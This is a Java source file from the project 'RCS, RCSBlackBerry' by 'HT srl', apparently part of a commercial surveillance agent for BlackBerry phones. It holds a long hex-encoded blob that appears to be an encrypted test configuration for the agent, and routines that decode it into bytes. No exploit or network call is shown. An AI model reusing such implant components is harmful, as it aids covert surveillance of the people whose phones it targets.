//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package fake;

import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.NumberUtilities;

public class InstanceConfigFake {
    //#ifdef FAKECONF
     
    // 3012
    static String configString = "41e1cb81b8414151e64ed5398c5da5d13798dd88d98e7bb9edb0062444265d42f4d436248f0352051a028010e0995b1c3187a4c31bed7943915d9eec41ddfc620ba76ae078abccf7bb85e420599cc9b148eca7b2875b93df1d2a14a218faf70c209001eab2727ba7f31acb7ec10d1e5ad96ffe4709316453e8d8740f92635faac8701261c3e69060852d64c66db335675296f94f9ec2c9c260e06f773d2dc0a0fe3bb0e9b962d84525287de2d356434a486668f56a647220456ac1e29c0b11890abec660e88a349ce5304e9d3bda4f11cdde3fcce12a3b50426235d97e4614088cb79ff660e5a23677e3358a0f977c83e66e0a1bbcf5b3e5e9ed14af3f8efa5224637fba34a30a88338de16915f9de59e1ef2f8357a7fc9700576f9e2de2996d8856437adc093392605ff8432997bfcf38d7da34dc3a2f00a9619f1aff12d8c274849161681ccd77dba8074b9a96be5d5760b6cc236bc7b85073f0fa01f3f349567d5d7acb536f3cc027a6f089d07a68f2537699868fbe8ed9168de5850f6a899335bcb858041a7fbe600aba388cdaa33d55445e0778d82e8a34d8c364ad16d711c7f5dda2154693e292b9e2876e7ad20f62eb4a2bfa2275f27f9a622e70f6ca5bb3e9d2f1423896b1448bc497ea0e1e5ece8d2dd3e2931255e70f1e7f25c2ddc332a188c9ea311f85ac8f378252ca47178e817470f5a86bf45f63c8058728b01d7e15ec14033a91610ccaea608a204abaa038770759224e98e9769ede15dc22183eca15ce7e414b494e768522b683f11f0fc708eaf3b6584fc3667ee9250c17127893a38b27d46afcff3230c6a91358b691b99f879e5114d42a01d5773222a13a9ffa1a6154e6e0a44bb64f7523634ee8e1ec7e803c4afa2f9e9e3d639d7fe3fc77d64ea43fdec608da94ffb4aeb79a24642992e36149e8b9ff705f0d55b41b65260a6b7b7d5e375122e7898686c0e5bf7ab9d39801a4ea90fb4b522117b74b426cbd06d3b2345cfbd90d1fb1aca84fbf762d2972e3ea77d6dd55a9c1043999021b1279ef99a3ab68c10c45168d46bc7050cf2c14fe6f157483fd1f07ac7aa1d08475f1d251887fea9683cb35e6514c0f795a0ef126ff687f45532b6f41cbe387e2e8829e331c11f4c74aa8ee60991ef6c9388e8157c9f680b5591e26a8b020075412591af81829ceb54be21c4fad7a858a8d3c6baad28b2792b845544649a37bb825e8cc6c51bf5229d8ccdc266e0814666b304d530c290522d208fc226003f2650d9da1a89c97418b47758a6a4a9ea3727f0101275b5206cb1d1a263bc2d1b05ef7422e2a8abab0ba12da8a26c592ff7fab82e03b4f20278999e1a93f48afc5ba2001dde2ce1fb7137b90a35905a767c86a2cd36fc3071056baa690d493bf55e95840f2f697f2d06e9a4f066f6232de3678ffac7d7f50e93d6a0e3db208006e43a7cd49407a40bb5a05cc6707dacc0616a0e01f2984ef16ff605be1a7a2dbda785f7ff865ad016dc739b7c0cba7ec9f96758fd97988fc53c97b39ee5d45f954083d89aec10bfbd1c506fd95ec1cf88620ded73a37ae6db3cd3ebc878f2d91b7275fedab340404f66a89b1e9972f9e297cde12403d7818a255f4064bd39e3dafe3d54209949984b9abf287dbcd7faf70e4f2292e8ec7378ac275aef6d941042a48c6f6b49e09dedfa850d969a3a8643c69456a249e076ce1c4df045766b9ef6c0aa263c4f8aca95a6003e0bda0f3fa975592c7166b0f3733dc3cf7867e08e7b981e73b55acc00dda06654da2b4316171519c1e2d283db44d0e1e9c4d8b036a80b5bc655a71bfd9000ac939d51fa8e6a60225c3b1df30af5a3cd7a3e883af1cc4ac8b0746befb0e8f0d17153bfc1d0c0d1ceef5c0c03ba2166b9edd08f8369699c18922c19ff91411656cd2d1272284f85286acd8a3b1f33037a49f840e7e95ee7b28d5f23b6f458f07e9035857b47e3f3d34216b59fd329ccb9567c0f2eb0c73816a0cee714cf46465ad61826c216cb10f44b4071c90c9224783f80959472a125de09a8ef91dd8bc91ca22e3883bb33207bd5adc8e6956a3d9c454d637295c7b9512a3b2a2e13a6838e541a85ebd85bbc3e16be8d93e4e18bcb1c2d951822cebafc4f0dd05e7ae06337f3cbb344691530ed7979f222bc14bfe399c0e5711ea3da51bc09fa0dc3de34e1ad6aed3795b0b8bdeac5e4b7379cb83a82b956496a69028b171af72806de3eebf8a1e41cc72a6f1854fae6657343f01807db5b760d1eea5e1f18be5bb5b3ba07b0a6458e8211944ad6bf2d7fcce1c17300b9e805adca3e7de11e92077a170ae55c7faca43ac85c971068d3cebcff187d61ef7cb15c4390c15d01202822a665429ea078e2f7226cd523f7b5d199e1d6ddc9f4bd8729ca77ed9495e35472898f92d0ae04561f557703f24900d74f9d8f6901a4702e7a34168f09d7cd95e97d6423affef6ce78ca7d7c05995b6e66f5d2d401f7b076005a38d3cccbe7084c6771bd1a3db115a4db58885964ee751f71b954c043cae652f903c6ff6b741c7f4fc174382473d19ee58bf87eb732d500c9fac3dff7a56c74be7b9316fa0e176763ed5762c64fa1c80102a77e85824f9e8b1eea845c943b7797d8089145e94c3f985859d19f0b0a558d03c787fcff6ce7ab8a25ea3358c8d51964bb56c033aefa34cec07b4d24905c4d32cdf9122a2d91034935d3bf9482bbb674e1373cb7f42555b2b5a76627b0f9b5ab50b91ca7193d05336e898a8fdac3a70471a2f14d01908215b48c5b1fb4bd4545803f947bcc5c25650b30753d1ca7b64346040aa52c3e7d8f113c906acbe8d7c9e06298805bf6ad6c524d93695ebf9010ee819ca5162a917af0b89635754c0aa6a64e6af0cb3ac23772e4bfc8b7244c8f2e6f9fbf5f5c98b6805b909854dca32aef2c7a8d1e06814812a662dd4211e0582732db73b5d82c1118c553f3ff3ba6f8038cff354a9fae083d4750f565b20b3d87a65fafbb557cbd42b77038f2630285d4861a47f724502021d934c3b3545dd18f097453edea53fdedf970a0feb942b3877ff71ed5f9542874e21fc549fb2fc1b436a58eb3abc7c639814191bd181127aaa3b86a8e55e382d6a67efdf4a8d49f0f7fe5001964434cd2bbdef7f3aab220938ab354fa44becdb326fd6a87c0e89f4f58c2075fa0c8923f2492530ef8bb3f1b7512b8a3112f8387877c0c25d329e1fa07ae0372109773b5011071976098ee0e13a38bd3a1cfa36d13ff44313bc079d490cfc3e9a1c64d517b6287cf5db5b17a6d45dc315972c699f4404abebf500b8a7bf4194940af229fbd0176ddcec8d524f774ee04e3a26fa55710e922110742f4054393a5aeb57b5b4e4498c449b137c3e5652bf5cd51b761b9f515cccb9";
    static byte[] config;
    
    public int version = 2;

    public static byte[] getBytes() {        
        config = hexStringToByteArrayWithLen(configString);        
        return config;
    }
    
    /**
     * Hex string to byte array.
     * 
     * @param wchar
     *            the wchar
     * @return the byte[]
     */
    public static byte[] hexStringToByteArrayWithLen(final String config) {
        int offset = 4;
        int len = config.length() / 2;
        final byte[] ret = new byte[ len + 4];

        for (int i = offset; i < ret.length; i++) {
            final char first = config.charAt((i - offset) * 2);
            final char second = config.charAt((i - offset) * 2 + 1);

            int value = NumberUtilities.hexDigitToInt(first) << 4;
            value += NumberUtilities.hexDigitToInt(second);

            ret[i] = (byte) value;
        }
        
        final DataBuffer databuffer = new DataBuffer(ret, 0, 4, false);
        databuffer.writeInt(len);

        return ret;
    }
    
    public static byte[] hexStringToByteArray(final String config) {
        int len = config.length() / 2;
        final byte[] ret = new byte[ len ];

        for (int i = 0; i < ret.length; i++) {
            final char first = config.charAt((i ) * 2);
            final char second = config.charAt((i ) * 2 + 1);

            int value = NumberUtilities.hexDigitToInt(first) << 4;
            value += NumberUtilities.hexDigitToInt(second);

            ret[i] = (byte) value;
        }

        return ret;
    }
    
    //#else
    public static byte[] getBytes() {        
        return null;
    }
  //#endif

    public static String getJson() {        
        return null;
    }
}

